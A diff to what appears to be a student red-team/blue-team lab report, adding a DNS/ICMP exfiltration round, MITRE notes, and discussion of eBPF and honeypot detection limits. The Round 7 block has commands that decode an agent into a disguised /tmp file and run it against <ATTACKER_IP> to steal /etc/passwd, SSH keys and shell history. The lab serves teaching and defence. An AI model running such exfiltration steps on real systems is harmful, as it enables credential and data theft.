@@ -65,6 +65,7 @@ The demo is structured as a 7-round engagement:
 | 4 | Red | Re-attack | Blocked by eBPF |
 | 5 | Red | TCP reverse shell (evasion) | Bypasses eBPF v1 |
 | 6 | Blue | eBPF v2 deployed | Reverse shell detected and killed |
+| 7 | Red | DNS/ICMP data exfiltration | Sensitive files extracted to attacker machine |
 
 Every step is documented with exact commands and expected outputs in `docs/DEMO_FLOW.md` so any team member can reproduce the full exercise.
 
@@ -100,6 +101,8 @@ MITRE ATT&CK is a knowledge base of adversary behavior based on real-world obser
 | Command and Control | T1571 | Non-Standard Port | C2 and reverse shell on port 4444 |
 | Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol | DNS/ICMP data exfiltration |
 
+Note on T1620: We use Reflective Code Loading rather than T1055.009 (Proc Memory) because our technique executes code from the process's own anonymous file descriptor (`/proc/self/fd/N` via `execve`), not by injecting into another process's address space via `/proc/[pid]/mem`. The distinction matters -- T1055.009 describes cross-process injection, while our attack is self-contained in-memory execution.
+
 ### 2.3 Extended Berkeley Packet Filter (eBPF)
 
 eBPF allows sandboxed programs to run in Linux kernel space without modifying kernel source code or loading kernel modules [5]. Originally designed for packet filtering, it has since become a general-purpose in-kernel virtual machine used for networking, observability, and security.
@@ -108,7 +111,7 @@ What makes eBPF useful for our defense layer:
 
 - **Kernel-space execution**: eBPF programs see all syscalls with zero context-switch overhead, and userspace processes cannot evade them.
 - **Safety guarantees**: The eBPF verifier checks every program before loading -- no unbounded loops, no out-of-bounds access, no kernel crashes.
-- **Active response**: Since Linux 5.3, `bpf_send_signal()` lets eBPF programs send SIGKILL directly from kernel space, so we can terminate a malicious process without a userspace round-trip [6].
+- **Active response**: The `bpf_send_signal()` helper, added to the kernel in 2019 (Linux 5.3) [6] -- two years after the eBPF foundations described in [5] -- lets eBPF programs send SIGKILL directly from kernel space, so we can terminate a malicious process without a userspace round-trip.
 - **Tracepoint hooks**: We attach to syscall entry points (`sys_enter_*`), which fire before the syscall handler runs. This means we can detect and block operations before they complete.
 
 In this project, we hook six tracepoints: `sys_enter_memfd_create`, `sys_enter_execve`, `sys_enter_socket`, `sys_enter_connect`, `sys_enter_dup2`, and `sys_enter_dup3`.
@@ -131,7 +134,7 @@ We use CTR mode for the C2 channel because it does not require padding (cipherte
 
 ### 3.1 Server-Side Template Injection (SSTI)
 
-**Problem**: The target application (`target_app.py`) is a Flask web app that uses Python f-string interpolation to embed user input directly into a Jinja2 template before rendering. This is a textbook Server-Side Template Injection vulnerability (CWE-1336) [9].
+**Problem**: The target application (`target_app.py`) is a Flask web app that uses Python f-string interpolation to embed user input directly into a Jinja2 template before rendering. This is a textbook Server-Side Template Injection vulnerability (CWE-1336; also classified under the more commonly cited CWE-94, Code Injection) [9].
 
 **Mechanism**: When a user submits a diagnostic query, the application constructs the template as:
 
@@ -221,6 +224,8 @@ The rule is inserted at position 1 (highest priority) in the INPUT chain, so it 
 
 **Effectiveness**: Zero false positives -- any connection to the honeypot is unauthorized by definition.
 
+**Discussion -- port choice**: We use port 2222, which an experienced attacker running nmap might recognize as a common honeypot port. In a production deployment you would put the honeypot on a more convincing port (e.g., 22). We keep 2222 in the lab to avoid conflicting with real SSH, and because the demo explicitly shows the attacker falling for it during reconnaissance.
+
 **Limitation**: IP-based blocking is easily circumvented by changing the source IP (e.g., via IP aliasing). This is why we need Layer 2.
 
 ### 4.2 Layer 2: Kernel-Level Detection -- eBPF MDR
@@ -248,6 +253,8 @@ Keeps all v1 hooks and adds three new ones to detect reverse shells:
 | Hook 6 | `sys_enter_dup3` | Same as Hook 5, covering Python's `os.dup2(fd, fd2, inheritable=False)` code path |
 
 The `connect` hook gives fast port-based detection at connection time, while the `dup2/dup3` hooks provide port-agnostic detection based on the behavioral signature of fd redirection.
+
+**Limitation of port-based detection**: If the attacker uses a common port like 443 or 80 for the reverse shell, the `connect` hook's suspicious-port check would miss it. However, the `dup2/dup3` behavioral hooks still catch the shell because redirecting all three standard file descriptors (0, 1, 2) to a socket is inherently suspicious regardless of the destination port.
 
 ### 4.3 Real-Time Operational Visibility -- SOC Dashboard
 
@@ -296,6 +303,8 @@ This upgrade illustrates two things: first, real-world malware increasingly uses
 │  Aggregates all events in real-time web UI           │
 └─────────────────────────────────────────────────────┘
 ```
+
+**Known gap -- data exfiltration**: The current two-layer defense focuses on detecting C2 establishment and malicious process behavior. It does not include monitoring for data exfiltration channels (DNS tunneling, ICMP data embedding) described in Section 3.5. Detecting DNS exfiltration would require a separate mechanism -- for example, analyzing DNS query patterns for abnormally long subdomain labels or high query frequency to uncommon domains. This is outside the scope of our current eBPF hooks (which monitor process-level syscalls, not network payload content) and is left as a known limitation. In the demo, we show exfiltration succeeding to illustrate that even a two-layer defense has blind spots.
 
 ---
 
@@ -427,6 +436,26 @@ sudo .venv/bin/python3 blue_team/blue_ebpf_mdr_v2.py --kill
 # WSL2 T4: re-attack with reverse shell
 # → v2 detects connect() to port 4444 + dup2 fd hijack → SIGKILL
 ```
+
+### Round 7 — Red Exfiltrates Data (Defense Gap)
+
+```bash
+# WSL2 T3: start exfil listener
+sudo .venv/bin/python3 red_team/exfil_listener.py
+
+# In existing shell session on target (from Round 5 re-attack before v2 kills it):
+# Deploy exfil agent via base64 one-liner
+echo '<base64_of_exfil_agent.py>' | base64 -d > /tmp/.cache_update.py
+python3 /tmp/.cache_update.py <ATTACKER_IP>
+# → agent collects /etc/passwd, SSH keys, bash history
+# → sends via DNS queries to attacker's fake DNS server
+# → eBPF v2 does not detect this (no memfd, no reverse shell pattern)
+
+# WSL2 T3: check received files
+ls -la loot/
+```
+
+This round demonstrates that even with both defense layers active, data exfiltration via DNS/ICMP covert channels goes undetected -- the current eBPF hooks monitor process behavior (memfd_create, reverse shell fd patterns), not network payload content.
 
 ---
 
